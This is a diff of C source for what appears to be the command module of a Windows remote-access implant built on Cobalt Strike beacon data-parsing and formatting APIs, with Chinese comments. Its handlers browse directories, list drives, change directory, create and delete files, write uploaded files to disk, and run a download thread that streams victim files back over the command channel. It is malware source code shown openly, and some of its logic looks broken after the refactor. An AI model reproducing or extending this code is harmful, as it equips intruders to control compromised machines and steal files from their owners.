@@ -1,48 +1,15 @@
-#define _TIMESPEC_DEFINED  // 防止 windows.h 重复定义 timespec
-#define WIN32_LEAN_AND_MEAN
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include "Command.h"
-#include <iphlpapi.h>
-#pragma warning(disable:4996)
-#define PATH_MAX 4096
-#define MAX_PATH_LENGTH 1048
-#define MAX_TIME_STRING_LENGTH 50
-extern unsigned char AESRandaeskey[16];
-extern int Counter;
+#include "File.h"
+#include "Api.h"
 
-// 辅助函数：追加到 resultStr
-#define APPEND_FMT(fmt, ...) do { \
-        wchar_t temp[1024]; \
-        int n = swprintf(temp, 1024, fmt, __VA_ARGS__); \
-        if (n > 0) { \
-            size_t needed = bufLen + n + 1; \
-            if (needed > bufCap) { \
-                bufCap = needed * 2; \
-                resultStr = (wchar_t*)realloc(resultStr, bufCap * sizeof(wchar_t)); \
-                if (!resultStr) { \
-                    _findclose(handle); \
-                    free(path); \
-                    return NULL; \
-                } \
-            } \
-            wcscpy(resultStr + bufLen, temp); \
-            bufLen += n; \
-        } \
-    } while(0)
-
-#define MAX_EXISTING_FILENAME 0x2000
-#define MAX_NEW_FILENAME      0x2000
-
-wchar_t* convertToWideChar(const char* input) {
+wchar_t* convertToWideChar(char* input) {
     if (input == NULL) {
         return NULL;
     }
 	// 第一次调用获取所需缓冲区大小
     int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
     if (len == 0) {
-        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
+        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n\n", GetLastError());
         return NULL;
     }
 
@@ -53,7 +20,7 @@ wchar_t* convertToWideChar(const char* input) {
     }
 
     if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
-        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
+        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n\n", GetLastError());
         free(wideStr);
         return NULL;
     }
@@ -61,7 +28,7 @@ wchar_t* convertToWideChar(const char* input) {
     return wideStr;
 }
 
-unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
+char* convertWideCharToUTF8(const wchar_t* wideStr) {
     if (!wideStr) {
         return NULL;
     }
@@ -69,18 +36,18 @@ unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
     // 包含 \0
     int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
     if (utf8Len == 0) {
-        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
+        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n\n", GetLastError());
         return NULL;
     }
 
-    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len);
+    char* utf8Str = (char*)malloc(utf8Len);
     if (!utf8Str) {
 		fprintf(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
     if (WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Len, NULL, NULL) == 0) {
-        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
+        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n\n", GetLastError());
         free(utf8Str);
         return NULL;
     }
@@ -96,7 +63,7 @@ D    0    2025/08/25 20:10:12    Documents
 F    12345    2025/08/24 18:22:11    file.txt
 */
 
-unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
+char* listDirectory(char* dirPathStr, size_t* dirPathStrLen) {
     if (!dirPathStr || !dirPathStrLen) {
         return NULL;
     }
@@ -109,7 +76,6 @@ unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
 	}
     struct _wfinddata_t file_info;
     intptr_t handle;
-    wchar_t search_path[MAX_PATH_LENGTH];
     size_t len = wcslen(path);
 
 	// 去除路径末尾的 \ 或者 /
@@ -117,11 +83,8 @@ unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
         path[len - 1] = L'\0';
     }
 
-    // 拼接搜素模式
-    swprintf(search_path, MAX_PATH_LENGTH, L"%s\\*", path);
-
     // 尝试打开目录，如果失败就默认搜索 C:\*。
-    handle = _wfindfirst(search_path, &file_info);
+    handle = _wfindfirst(path, &file_info);
     if (handle == -1L) {
         free(path);
         fprintf(stderr, "Unable to open directory: %ls\n", path);
@@ -140,7 +103,7 @@ unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
     resultStr[0] = L'\0';
 
     // 加入目录路径
-    APPEND_FMT(L"%s\n", search_path);
+    APPEND_FMT(L"%s\n", path);
 
     // 强制加入 "." 和 ".."
     APPEND_FMT(L"D\t0\t-\t.\n");
@@ -170,7 +133,7 @@ unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
     free(path);
 
     // 转成 UTF-8
-    unsigned char* resultStrchar = convertWideCharToUTF8(resultStr);
+    char* resultStrchar = convertWideCharToUTF8(resultStr);
     free(resultStr);
 
     if (resultStrchar) {
@@ -183,340 +146,276 @@ unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
     return resultStrchar;
 }
 
-unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t* msgLen) {
-    uint8_t pendingRequest[4];
-    uint8_t dirPathLengthBytes[4];
+unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    formatp format;
+    datap parser;
+    int pendingRequest;
 
-	// 数据包格式： pendingRequest(4Bytes) | dirPathLen(4Bytes) | dirPath(dirPathLen Bytes)
-    memcpy(pendingRequest, commandBuf, 4);
-    memcpy(dirPathLengthBytes, commandBuf + 4, 4);
-    uint32_t dirPathLen = bigEndianUint32(dirPathLengthBytes);
-
-    if (dirPathLen == 0) return NULL;
-
-    unsigned char* dirPath = (unsigned char*)malloc(dirPathLen + 1);
-    if(!dirPath) {
-        fprintf(stderr, "Memory Allocation failed\n");
+    char* path = (char*)malloc(MAX_FILENAME);
+    if (!path) {
+        fprintf(stderr, "Memory allocation failed\n");
         return NULL;
-	}
-    unsigned char* dirPathStart = commandBuf + 8;
+    }
+	memset(path, 0, MAX_FILENAME);
 
-    memcpy(dirPath, dirPathStart, dirPathLen);
-    dirPath[dirPathLen] = '\0';
-    
-    // 去除 * 
-    // C:\foo\*bar → C:\foo\bar
-    unsigned char* tempPath = str_replace_all(dirPath, "*", "");
-    free(dirPath);
-    if (!tempPath) return NULL;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    pendingRequest = BeaconDataInt(&parser);
+    BeaconDataStringCopySafe(&parser, path, MAX_FILENAME);
 
-    unsigned char* dirPathStr = NULL;
-    
-    // 表明首次进入CmdFileBrowse
-    if (strncmp((char*)tempPath, ".\\", 2) == 0)
+    BeaconFormatAlloc(&format, 0x800);
+    BeaconFormatInt(&format, pendingRequest);
+
+    // 表明首次进入 CmdFileBrowse
+    if (!strncmp(path, "." SOURCE_DIRECTORY, MAX_FILENAME))
     {
-        char cwd[PATH_MAX];
-        if (getcwd(cwd, sizeof(cwd)) == NULL) {
-            fprintf(stderr, "getcwd failed\n");
-            return NULL;
-        };
-        // 动态分配完整路径
-        // 加 1 是因为相对 Path 为空
-        size_t absLen = strlen(cwd) + 1; 
-        dirPathStr = (unsigned char*)malloc(absLen + 1);
-        if (!dirPathStr) {
-            free(tempPath);
-            return NULL;
-        }
-        snprintf((char*)dirPathStr, absLen + 1, "%s", cwd);
-        free(tempPath);
+        GetCurrentDirectoryA(MAX_FILENAME, path);
+        strncat_s(path, MAX_FILENAME, SOURCE_DIRECTORY, strlen(SOURCE_DIRECTORY));
     }
-    // 后面开始调用 CmdFileBrowse
-    else {
-		// '/' -> '\'
-        dirPathStr = str_replace_all(tempPath, "/", "\\");
-        free(tempPath);
-        if (!dirPathStr) return NULL;
-    }
+
+    BeaconFormatPrintf(&format, "%s\n", path);
 
     // 列目录
     size_t dirPathStrLen = 0;
-    unsigned char* result = listDirectory(dirPathStr, &dirPathStrLen);
-    free(dirPathStr);
+    char* result = listDirectory(path, &dirPathStrLen);
     if (!result) return NULL;
     
-    // 拼接消息
-    uint8_t* metaInfoArrays[] = { pendingRequest, result };
-    size_t metaInfoSizes[] = { 4, dirPathStrLen };
-    size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
-    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
-    size_t metaInfoTotalSize = 0;
-
-    for (size_t i = 0; i < metaInfoCounts; ++i) {
-        metaInfoTotalSize += metaInfoSizes[i];
-    }
-
-    *msgLen = metaInfoTotalSize;
-
-    return metaInfoMsg;
-}
-
-unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, DWORD chunkNumber) {
-    uint8_t fileNameLenBytes[4];
-
-	// commandBuf 数据结构如下
-	// fileNameLenBigEndian(4Bytes) | fileName(fileNameLenBigEndian Bytes) | fileContent(rest Bytes)
-    unsigned char* fileNameLength = commandBuf;
+	BeaconFormatPrintf(&format, "%s", result);
     
-    memcpy(fileNameLenBytes, fileNameLength, 4);
-
-    uint32_t fileNameLenBigEndian = bigEndianUint32(fileNameLenBytes);
-    unsigned char* fileName = (unsigned char*)malloc(fileNameLenBigEndian + 1);
-    if(!fileName){
-        fprintf(stderr, "Memory Allocation failed for fileName\n");
+	*msgLen = BeaconFormatLength(&format);
+	unsigned char* postMsg = (unsigned char*)malloc(*msgLen + 1);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        BeaconFormatFree(&format);
+        free(result);
+        free(path);
 		return NULL;
     }
-    fileName[fileNameLenBigEndian] = '\0';
+	memcpy(postMsg, BeaconFormatOriginal(&format), *msgLen);
+	postMsg[*msgLen] = '\0';
 
-    
-    unsigned char* fileNameBuffer = commandBuf + 4;
-    memcpy(fileName, fileNameBuffer, fileNameLenBigEndian);
+	BeaconFormatFree(&format);
+    free(result);
+    free(path);
 
-    size_t fileContenthLen = commandBuflen - 4 - (size_t)fileNameLenBigEndian;
-    unsigned char* fileContent = commandBuf + fileNameLenBigEndian + 4;
+    return postMsg;
+}
 
-    unsigned char* buffer = (unsigned char*)malloc(1024);
+unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, unsigned char* mode) {
+    // 数据结构如下：
+    // fileNameLength(4 Bytes) | fileName(fileNameLenngth Bytes) | fileContent(rest Bytes)
+    datap parser;
+    FILE* file;
 
-    if (!buffer) {
-        fprintf(stderr, "Memory Allocation failed for chunk\n");
+    char* fileName = (char*)malloc(sizeof(char) * 1024);
+    if (!fileName) {
+		fprintf(stderr, "Memory Allocation failed\n");
         return NULL;
     }
 
-    size_t bytesRead;
-    size_t offset = 0;
-
-    // 每次写入 1KB
-    while (offset < fileContenthLen) {
-        size_t remaining = fileContenthLen - offset;
-        size_t bufferSize = remaining > 1024 ? 1024 : remaining;
-
-        memcpy(buffer, fileContent + offset, bufferSize);
-
-        if (Upload(fileName, buffer, bufferSize, chunkNumber)) {
-            offset += bufferSize;
-            chunkNumber++;
-        }
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    if (!BeaconDataStringCopySafe(&parser, fileName, 1024)) {
+		fprintf(stderr, "Failed to extract fileName from commandBuf\n");
+        return NULL;
     }
 
-    unsigned char* Uploadstr = "[+] Upload Successfully! File Size:";
-    unsigned char offsetStr[20];     
+	file = fopen(fileName, mode);
+    if (file == INVALID_HANDLE_VALUE || file == NULL) {
+        free(fileName);
+		fprintf(stderr, "Failed to open file %s for writing. Error:%lu\n\n", fileName, GetLastError());
+        return NULL;
+    }
+
+	fwrite(BeaconDataBuffer(&parser), 1, BeaconDataLength(&parser), file);
+
+    const char* prefix = "[*] Upload Successfully! File Size:";
+    char offsetStr[20];     
     // 将整数转换为字符串
-	// size_t 为 long long 类型使用%lld
-    sprintf(offsetStr, "%zu", offset);
-    unsigned char* result = (unsigned char*)malloc(strlen(offsetStr) + strlen(Uploadstr) + 1);
-    if (result) {
-        memcpy(result, Uploadstr, strlen(Uploadstr));
-        memcpy(result + strlen(Uploadstr), offsetStr, strlen(offsetStr));
-        *msgLen = strlen(offsetStr) + strlen(Uploadstr);
+    sprintf(offsetStr, "%zu", BeaconDataLength(&parser));
+    unsigned char* postMsg = (unsigned char*)malloc(strlen(offsetStr) + strlen(prefix) + 1);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed for result\n");
+        free(fileName);
+        fclose(file);
+		return NULL;
     }
-	result[*msgLen] = '\0';
+
+    memcpy(postMsg, prefix, strlen(prefix));
+    memcpy(postMsg + strlen(prefix), offsetStr, strlen(offsetStr));
+    *msgLen = strlen(offsetStr) + strlen(prefix);
+    postMsg[strlen(offsetStr) + strlen(prefix)] = '\0';
 
     free(fileName);
-    free(buffer);
-    return result;
-}
-
-BOOL Upload(unsigned char* filePath, unsigned char* fileContent, size_t fileContentSize, int isStart) {
-    FILE* file;
-    const char* mode;
-    
-    if (isStart == 1) {
-        // 如果文件已存在，会清空原有内容（文件长度变为 0）
-        // 如果文件不存在，会新建文件
-        // 写入时从文件开头开始写
-        mode = "wb"; 
-    }
-    else {
-        // 如果文件已存在，写入的位置永远在文件末尾，不会覆盖前面的内容
-        // 如果文件不存在，会新建文件
-        mode = "ab"; 
-    }
-
-    file = fopen(filePath, mode);
-    if (file == NULL) {
-        perror("File Open Error");
-        return FALSE;
-    }
-
-    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), fileContentSize, file);
-    if (bytesWritten != fileContentSize) {
-        perror("File Write Error");
-        fclose(file);
-        return FALSE;
-    }
-
     fclose(file);
-    return TRUE;
+    return postMsg;
 }
 
-unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen) {
+unsigned char* CmdDrives(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
 
-    DWORD drives = GetLogicalDrives();
-    unsigned char drivesStr[20];
-    // 转化为字符串
-    sprintf(drivesStr, "%d", drives);
+    formatp formatp;
+    BeaconFormatAlloc(&formatp, 128);
 
-    unsigned char* result = (unsigned char*)malloc(strlen(drivesStr) + 1);
-    if (result) {
-        memcpy(result, drivesStr, strlen(drivesStr));
-        result[strlen(drivesStr)] = '\0';
-        uint8_t command[4];
-        memcpy(command, commandBuf, 4);
+    int value = BeaconDataInt(&parser);
+    BeaconFormatInt(&formatp, value);
 
-        uint8_t* metaInfoArrays[] = { command, result };
-        size_t metaInfoSizes[] = { 4, strlen(result) };
-        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
-        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
-        size_t metaInfoTotalSize = 0;
+    DWORD logicalDrives = GetLogicalDrives();
+    BeaconFormatPrintf(&formatp, "%u", logicalDrives);
 
-        // 计算所有 sizeof 返回值的总和
-        for (size_t i = 0; i < metaInfoCounts; ++i) {
-            metaInfoTotalSize += metaInfoSizes[i];
-        }
-        *msgLen = metaInfoTotalSize;
-
-        return metaInfoMsg;
+    *msgLen = BeaconFormatLength(&formatp);
+    unsigned char* postMsg = (unsigned char*)malloc(BeaconFormatLength(&formatp) + 1);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
     }
+    memcpy(postMsg, BeaconFormatOriginal(&formatp), BeaconFormatLength(&formatp));
+    postMsg[BeaconFormatLength(&formatp)] = '\0';
+
+    BeaconFormatFree(&formatp);
+
+    return postMsg;
 }
 
-unsigned char* CmdPwd(unsigned char* commandBuf, size_t* msgLen) {
+unsigned char* CmdPwd(size_t* msgLen) {
     // 获取缓冲区所需大小，包括'\0'
-    DWORD bufferSize = GetCurrentDirectoryA(0, NULL); 
+    DWORD size = GetCurrentDirectoryA(0, NULL); 
 
-    if (bufferSize == 0) {
-        unsigned char* error = "[-] Error Get Directory";
-        unsigned char* errorBuffer = (unsigned char*)malloc(strlen(error) + 1);
-        memcpy(errorBuffer, error, strlen(error));
-        *msgLen = strlen(error);
-        return errorBuffer;
+    if (size == 0) {
+        fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n\n", GetLastError());
+        return NULL;
     }
 
-    unsigned char* lpcurrentPath = (unsigned char*)malloc(bufferSize + 1);
+    char* lpcurrentPath = (char*)malloc(size + 1);
+    if (!lpcurrentPath) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
+    memset(lpcurrentPath, 0, size + 1);
 
     // result 不包括'\0'
-    DWORD resultLen = GetCurrentDirectoryA(bufferSize, lpcurrentPath);
+    DWORD resultLen = GetCurrentDirectoryA(size, lpcurrentPath);
 
-    if (resultLen == 0 || resultLen > bufferSize) {
-		fprintf(stderr, "GetCurrentDirectoryA Failed With Error:%lu", GetLastError());
+    if (resultLen == 0 || resultLen > size) {
+		fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n", GetLastError());
         free(lpcurrentPath);
+        return NULL;
     }
 
     *msgLen = resultLen;
-	lpcurrentPath[*msgLen] = '\0';
+	lpcurrentPath[resultLen] = '\0';
 
     return lpcurrentPath;
 }
 
-unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen) {
-    unsigned char* computerName = (unsigned char*)malloc(MAX_COMPUTERNAME_LENGTH);
-    unsigned char* userName = (unsigned char*)malloc(UNLEN);
-
-    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
-
-    if (!GetComputerNameA(computerName, &size)) {
-        fprintf(stderr, "GetComputerNameA Failed With Error:%lu\n", GetLastError());
+unsigned char* CmdCd(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    char* targetWorkDirectory = (char*)malloc(commandBuflen + 1);
+    if (!targetWorkDirectory) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return  NULL;
+    }
+    memcpy(targetWorkDirectory, commandBuf, commandBuflen);
+    targetWorkDirectory[commandBuflen] = '\0';
+    if (!SetCurrentDirectoryA(targetWorkDirectory)) {
+        printf("SetCurrentDirectoryA failed with error:%lu\n\n", GetLastError());
+        free(targetWorkDirectory);
         return NULL;
     }
 
-    size = UNLEN + 1;
-    if (!GetUserNameA(userName, &size)) {
-        fprintf(stderr, "GetUserNameA Failed With Error:%lu\n", GetLastError());
+    const  char* prefix = "[*] Now work directory is ";
+
+    unsigned char* postMsg = (unsigned char*)malloc(strlen(prefix) + commandBuflen + 1);
+
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(targetWorkDirectory);
         return NULL;
     }
 
-    if (computerName && userName) {
-        size_t total_len = strlen(computerName) + strlen(userName) + 2; // 加两个'\0'
-        unsigned char* result = malloc(total_len + 1);
-        snprintf(result, total_len, "%s\\%s", computerName, userName);
-        *msgLen = total_len;
+    memcpy(postMsg, prefix, strlen(prefix));
+    memcpy(postMsg + strlen(prefix), targetWorkDirectory, commandBuflen);
 
-		result[*msgLen] = '\0';
-        return result;
-    }
+    *msgLen = strlen(prefix) + commandBuflen;
+    postMsg[strlen(prefix) + commandBuflen] = '\0';
+
+    return postMsg;
 }
 
 unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
-    if (!CreateDirectoryA((LPCSTR)commandBuf, NULL) != 0) {
-        fprintf(stderr, "CreateDirectoryA Failed With Error：%lu\n", GetLastError());
-        return NULL;
-    }
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
 
-    unsigned char* Mkdirstr = "[+] Mkdir Success:";
-    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + commandBuflen + 1);
-    if (result) {
-        memcpy(result, Mkdirstr, strlen(Mkdirstr));
-        memcpy(result + strlen(Mkdirstr), commandBuf, commandBuflen);
+    char* path = BeaconDataStringPointerCopy(&parser, 0x4000);
 
-        *msgLen = strlen(Mkdirstr) + commandBuflen;
+    _mkdir(path);
 
-		result[*msgLen] = '\0';
-
-        return result;
-    }
-}
-
-
-unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
-    DWORD attributes = GetFileAttributesA((LPCSTR)commandBuf);
-
-    if (attributes == INVALID_FILE_ATTRIBUTES) {
-        const char* errorMsg = "[-] Remove failed:Invalid path or file";
-        *msgLen = strlen(errorMsg);
-        unsigned char* result = (unsigned char*)malloc(strlen(errorMsg) + 1);
-        if (!result) {
-            fprintf(stderr, "Memory allocation failed\n");
-			return NULL;
-        }
-        memcpy(result, errorMsg, strlen(errorMsg));
-        return result;
-    }
-
-    int removeResult;
-    // 删除文件是目录的情况
-    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
-        removeResult = RemoveDirectoryA((LPCSTR)commandBuf);
-    }
-    // 文件
-    else {
-        removeResult = DeleteFileA((LPCSTR)commandBuf);
-    }
-
-    unsigned char* Removestr = removeResult == 0 ? "[-] Remove Failed:" : "[+] Remove Success:";
-    size_t RemovestrLen = strlen(Removestr);
-
-    *msgLen = RemovestrLen + commandBuflen;
-    unsigned char* result = (unsigned char*)malloc(*msgLen + 1);
-    if (result == NULL) {
+    char* preifx = "[*] Mkdir Success:";
+    unsigned char* postMsg = (unsigned char*)malloc(strlen(preifx) + strlen(path) + 1);
+    if (!postMsg) {
         fprintf(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
-    memcpy(result, Removestr, RemovestrLen);
-    memcpy(result + RemovestrLen, commandBuf, commandBuflen);
-	result[*msgLen] = '\0';
+    memcpy(postMsg, preifx, strlen(preifx));
+    memcpy(postMsg + strlen(preifx), path, strlen(path));
 
-    return result;
+    *msgLen = strlen(preifx) + strlen(path);
+    postMsg[strlen(preifx) + strlen(path)] = '\0';
+
+    return postMsg;
 }
 
-struct FileThreadArgs {
-    unsigned char* fileNameBuf;
-    size_t fileNameBufLen;
-};
+unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    char* path = BeaconDataStringPointerCopy(&parser, 0x4000);
 
-DWORD WINAPI myThreadFunction(LPVOID lpParam) {
+    DWORD attributes = GetFileAttributesA((LPCSTR)path);
+
+    if (attributes == INVALID_FILE_ATTRIBUTES) {
+        fprintf(stderr, "Removed target is not a directory or file\n");
+        return NULL;
+    }
+
+    BOOL bRet;
+    // 删除文件是目录的情况
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        bRet = RemoveDirectoryA((LPCSTR)path);
+        if (!bRet) {
+            fprintf(stderr, "RemoveDirectoryA failed with error:%lu\n\n", GetLastError());
+            return NULL;
+        }
+    }
+    // 文件
+    else {
+        bRet = DeleteFileA((LPCSTR)path);
+        if (!bRet) {
+            fprintf(stderr, "DeleteFileA failed with error:%lu\n\n", GetLastError());
+            return NULL;
+        }
+    }
+
+    char* prefix = bRet == FALSE ? "[*] rm failed: " : "[*] rm successfully: ";
+    size_t prelength = strlen(prefix);
+    size_t pathlength = strlen(path);
+
+    *msgLen = prelength + pathlength;
+    unsigned char* postMsg = (unsigned char*)malloc(prelength + pathlength + 1);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
+
+    memcpy(postMsg, prefix, prelength);
+    memcpy(postMsg + prelength, path, pathlength);
+    postMsg[*msgLen] = '\0';
+
+    return postMsg;
+}
+
+DWORD WINAPI downloadThread(LPVOID lpParam) {
     Sleep(2000);
     struct FileThreadArgs* args = (struct FileThreadArgs*)lpParam;
-    unsigned char* fileNameBuf = args->fileNameBuf;
+    char* fileNameBuf = args->fileNameBuf;
     size_t fileNameBufLen = args->fileNameBufLen;
     LPCSTR lpFilePath = (LPCSTR)fileNameBuf;
     uint64_t fileLen64Val;
@@ -532,240 +431,245 @@ DWORD WINAPI myThreadFunction(LPVOID lpParam) {
         // 最多下载 4GB 的文件
 		// 否则返回错误信息
         if (largeFileSize.QuadPart > UINT32_MAX) {
-            unsigned char* errorStr = "[-] The downloaded file is larger than 4GB";
+            const char* errorStr = "[-] The downloaded file is larger than 4GB";
 			unsigned char* errorBuffer = (unsigned char*)malloc(strlen(errorStr) + 1);
             if (errorBuffer) {
                 memcpy(errorBuffer, errorStr, strlen(errorStr));
                 errorBuffer[strlen(errorStr)] = '\0';
                 DataProcess(errorBuffer, strlen(errorBuffer), 0);
+                free(errorBuffer);
+                free(args->fileNameBuf);
+                free(args);
                 return FALSE;
             }
         }
 		// 文件大小已经在 4GB 范围内了, 可以直接赋值
         fileLen32Val = (uint32_t)largeFileSize.QuadPart;
     }
-
     else {
-        fprintf(stderr, "Failed to get file attributes:%lu\n", GetLastError());
+        fprintf(stderr, "GetFileAttributesExA failed with error:%lu\n\n", GetLastError());
+        free(args->fileNameBuf);
+        free(args);
         return FALSE;
     }
 
     // 开始构造数据包 
-    // 数据包格式: responseIdBigEndian(4Bytes) | fileLen32BigEndian(4Bytes) | buf(fileLen32BigEndian Bytes)
-    uint8_t fileLen32BigEndian[4];
-    PutUint32BigEndian(fileLen32BigEndian, fileLen32Val);
+    // 数据包格式: responseId(4 Bytes) | fileLen32Val(4 Bytes) | fileNameBuf(fileNameBufLen  Bytes)
     uint32_t requestId = (uint32_t)GenerateRandomInt(10000, 99999);
-    uint8_t responseIdBigEndian[4];
-    PutUint32BigEndian(responseIdBigEndian, requestId);
-    uint8_t* metaInfoArrays[] = { responseIdBigEndian, fileLen32BigEndian, fileNameBuf };
-    size_t metaInfoSizes[] = { 4, 4, fileNameBufLen };
-    size_t metaInfoCounts= sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
-    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
-    size_t metaInfoTotalSize = 0;
+    formatp format;
+    BeaconFormatAlloc(&format, MAX_POST_FILENAME + MAX_BUFFER);
+    BeaconFormatInt(&format, requestId);
+    BeaconFormatInt(&format, fileLen32Val);
+    BeaconFormatAppend(&format, fileNameBuf, fileNameBufLen);
 
-    for (size_t i = 0; i < metaInfoCounts; ++i) {
-        metaInfoTotalSize += metaInfoSizes[i];
-    }
-
-    DataProcess((unsigned char*)metaInfoMsg, metaInfoTotalSize, 2);
-
+    DataProcess((unsigned char*)BeaconFormatOriginal(&format), BeaconFormatLength(&format), CALLBACK_FILE);
+    
+    BeaconFormatFree(&format);
     HANDLE hFile = CreateFileA(fileNameBuf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-		fprintf(stderr, "CreateFileA Failed With Error:%lu\n", GetLastError());
+		fprintf(stderr, "CreateFileA failed with error:%lu\n\n", GetLastError());
+        free(args->fileNameBuf);
+        free(args);
+        CloseHandle(hFile);
         return FALSE;
     }
 
-    // 缓冲区 1MB
-    unsigned char* fileBuffer = (unsigned char*)malloc(1024 * 1024); 
+    unsigned char* fileBuffer = (unsigned char*)malloc(MAX_DOWNLOAD_BUFFER);
     if (fileBuffer == NULL) {
-		fprintf(stderr, "Memory allocation failed\n");
+        fprintf(stderr, "Memory allocation failed\n");
+        free(args->fileNameBuf);
+        free(args);
+        CloseHandle(hFile);
         return FALSE;
     }
 
     DWORD bytesRead;
-    // 数据包格式: requestIdBigEndian(4Bytes) | fileBuffer
+    BeaconFormatAlloc(&format, MAX_PACKET + 4);
+    // 数据包格式: requestId(4 Bytes) | fileBuffer
     while (TRUE) {
-        BOOL bRead = ReadFile(hFile, fileBuffer, 1024 * 1024, &bytesRead, NULL);
-        if (!bRead && GetLastError() != 0) {
+        BOOL bRet = ReadFile(hFile, fileBuffer, MAX_DOWNLOAD_BUFFER, &bytesRead, NULL);
+        if (!bRet) {
+            fprintf(stderr, "ReadFile failed with error: %lu\n\n", GetLastError());
+            free(args->fileNameBuf);
+            free(args);
+            CloseHandle(hFile);
             break;
         }
         // 数据读取完了
         if (bytesRead == 0) {
             break;
         }
-        uint8_t* metaInfoArrays[] = { responseIdBigEndian, fileBuffer };
-        size_t metaInfoSizes[] = { 4, bytesRead };
-        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
-        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
-        size_t metaInfoTotalSize = 4 + bytesRead;
 
-        DataProcess(metaInfoMsg, metaInfoTotalSize, 8);
+        // 构造数据包
+        BeaconFormatReset(&format);
+        BeaconFormatInt(&format, requestId);
+        BeaconFormatAppend(&format, fileBuffer, bytesRead);
+
+        DataProcess((unsigned char*)BeaconFormatOriginal(&format), BeaconFormatLength(&format), CALLBACK_FILE_WRITE);
+
         Sleep(50);
     }
 
-    unsigned char* downloadStr = "[+] Already Download file ";
-    unsigned char* resultStr = (unsigned char*)malloc(strlen(downloadStr) + fileNameBufLen + 1);
-    if (!resultStr) {
-        fprintf(stderr, "Memory allocation failed for result\n");
+    BeaconFormatFree(&format);
+    free(fileBuffer);
+
+    const char* prefix = "[*] Already download file: ";
+    unsigned char* postMsg = (unsigned char*)malloc(strlen(prefix) + fileNameBufLen + 1);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(args->fileNameBuf);
+        free(args);
         return FALSE;
     }
-    memcpy(resultStr, downloadStr, strlen(downloadStr));
-    memcpy(resultStr + strlen(downloadStr), args->fileNameBuf, fileNameBufLen);
-    size_t msgLen = strlen(downloadStr) + fileNameBufLen;
 
-    resultStr[msgLen] = '\0';
+    memcpy(postMsg, prefix, strlen(prefix));
+    memcpy(postMsg + strlen(prefix), args->fileNameBuf, fileNameBufLen);
